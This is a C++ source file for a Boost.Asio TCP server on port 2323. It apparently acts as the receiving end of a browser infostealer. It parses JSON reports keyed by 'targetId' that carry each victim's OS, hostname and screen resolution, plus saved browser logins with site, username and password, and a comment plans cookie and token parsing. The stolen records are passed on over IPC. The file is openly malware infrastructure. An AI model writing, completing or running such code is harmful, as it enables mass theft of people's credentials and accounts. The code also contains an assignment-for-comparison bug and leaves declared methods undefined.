#include <iostream>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/move/move.hpp>
#include <boost/json.hpp>
#include <condition_variable>
#include "ipc.hpp"

namespace ServerSide {

	enum:uint16_t {
		MAX_CONNECTIONS = 50,
		PORT = 2323//8080
	};

	namespace ba = boost::asio;
	namespace json = boost::json;
	using ba::ip::tcp; 
	using err_c = boost::system::error_code; 

	using RequestHandler = std::function<void(const std::string&)>;

	class Parser {
	public:
		Parser() {
			ipc._init();

			threadPool.emplace_back([this] {this->worker(); });
			threadPool.emplace_back([this] {this->worker(); });
			for (auto& t : threadPool) {
				if (t.joinable()) {
					t.detach();
				}
			}
		}
		~Parser() {
			stop_flag = true;
		}

		void worker() {
			while (!stop_flag) {		
				std::unique_lock<std::mutex>rdLock(mt);
				cv.wait(rdLock, [this] {return dataReady; });

				if (requests.size()) {
					parseMessage(requests.front()->reqData);
					requests.pop();
				}

				if (dataReady = true) { //if processed in one thread set dataReady to false for prevention of other thread atempt to parsing this request again.
					dataReady = false;
				}
				cv.notify_one();
			}
		}
		auto getReqHandler() {
			return std::bind(&Parser::requestHandler, this, std::placeholders::_1);
		}
		void requestHandler(const std::string &data) {
			std::lock_guard<std::mutex>locker(mt);

			requests.emplace(std::make_unique<Request>(std::move(const_cast<std::string&>(data))));

			dataReady = true;
			cv.notify_one();
		}
	private:
		::InterProcess::IPC ipc;

		std::mutex mt;
		std::condition_variable cv;
		bool dataReady = false;

		std::vector<std::thread>threadPool;
		std::atomic_bool stop_flag = ATOMIC_VAR_INIT(false);

		struct Request {
			explicit Request(std::string &&data):reqData(data) {};
			std::string reqData;
		};
		std::queue<std::unique_ptr<Request>>requests;

	private:
		void parseMessage(std::string &msg) {
			json::object jObj;
			try {
				jObj = boost::json::parse(msg).as_object(); //get jDoc obj.

				InterProcess::DataBuilder dataBuilder(jObj.at("targetId").as_string().c_str()); //create data builder for current target's data

				json::object targetInfo = jObj.at("targetInfo").as_object();  //gets all target's info
				dataBuilder.buildTargetInfo(targetInfo.at("os").as_string().c_str(),        //builds all target's info
											targetInfo.at("hostname").as_string().c_str(),
											targetInfo.at("resolution").as_string().c_str());
			
				for (auto& browser : jObj.at("Browsers").as_array()) { //iterations by browsers and their data's
					auto browsName = browser.as_string().c_str(); //current browser name
					dataBuilder.addBrowserData({}, std::optional(browsName)); //adds only the name to the browserData struct which is a part of the Data

					json::array loginData = jObj.at(browsName).at("loginData").as_array(); //pick all login's data of current browser
					for (auto& elem : loginData) {                                         //parse all login's data of current browser 
						dataBuilder.addBrowserData(std::optional(std::make_tuple(json::value_to<std::string>(elem.at("resource")), //adds login into the current browser struct in data
							json::value_to<std::string>(elem.at("login")),
							json::value_to<std::string>(elem.at("password")))
						),{});
					}
					//parse cookies tokens and etc.
					dataBuilder.commitBrowserData(); //after setting up a current browser data
				}
				ipc.newData(std::move(dataBuilder.getDataPtr())); //send all Data for ipc processing
			}
			catch (boost::system::system_error::exception& msg) {
				std::cout << msg.what();
			}
		}
	};

	class Server {
	public:
		Server()=default;
		~Server();
		void start();

	private:
		void acceptConnection();

	private:
		Parser _parser;

		ba::io_service _io_svc;
		tcp::socket _socket{ _io_svc };
		tcp::acceptor _a{ _io_svc,tcp::endpoint {{},PORT} };

		struct ClientSocketHandler : std::enable_shared_from_this<ClientSocketHandler> {
		public:
			ClientSocketHandler(tcp::socket&& sock, RequestHandler handler) :_sock(boost::move(sock)), _reqHandler(handler) {}
			~ClientSocketHandler(){
				_sock.shutdown(tcp::socket::shutdown_both);
				_sock.close();
			};

			void handle()  {
				auto self = shared_from_this();//for increase live time of current obj created as shared ptr in Server Class method
				_sock.async_read_some(ba::buffer(_buffer), [self, this](err_c ec, size_t bytesTransfered) {
					if (ec == boost::asio::error::connection_reset || ec==boost::asio::error::eof)
					{
						return; //if client socket send disconnection package after this current obj will be destroyed;
					}
					else if (!ec) {
						totalBytesTransfered += bytesTransfered; //counting arrived bytes
						request.reserve(totalBytesTransfered);   //allocate new memory for it
						copy(_buffer.begin(), _buffer.begin()+ bytesTransfered, back_inserter(request)); //copy all data from buffer

						_buffer.fill(0); //clear buffer before new write from socket

						handle(); //call it again and waiting for new tcp package 
					}
					if (bytesTransfered < 1024) { //when all the data arrived
						request.shrink_to_fit(); //cut all trash bytes
						_reqHandler(request);
						
						_buffer.fill(0);         //clear buffer
						totalBytesTransfered = 0; //set income bytes counter to deffault 
					}
					});
			}
		private:
			tcp::socket _sock;
			size_t totalBytesTransfered{0};
			std::array<char, 1024> _buffer;
			std::string request{""};

		private:
			RequestHandler _reqHandler;
		};
	};
};
